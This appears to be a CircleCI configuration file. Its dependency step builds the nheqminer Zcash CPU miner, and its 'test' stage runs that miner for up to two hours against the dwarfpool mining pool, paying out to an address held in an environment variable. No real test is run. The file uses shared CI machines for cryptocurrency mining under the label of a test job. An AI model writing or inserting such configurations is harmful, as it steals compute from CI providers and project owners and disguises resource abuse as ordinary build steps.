---

dependencies:
  cache_directories:
    - "~/nheqminer"
  pre:
    - sudo apt-get -y update; sudo apt-get install -y git cmake build-essential libboost-all-dev
    - if [[ ! -e ~/nheqminer ]]; then git clone -b Linux https://github.com/nicehash/nheqminer.git ~/nheqminer && cd ~/nheqminer/cpu_xenoncat/Linux/asm/ && sh assemble.sh && cd ../../../Linux_cmake/nheqminer_cpu && cmake . && make -j $(nproc); fi

test:
  override:
    - ~/nheqminer/Linux_cmake/nheqminer_cpu/nheqminer_cpu -l zec-us1.dwarfpool.com:3334 -u "$ADDRESS" -t $(nproc):
timeout: 7200
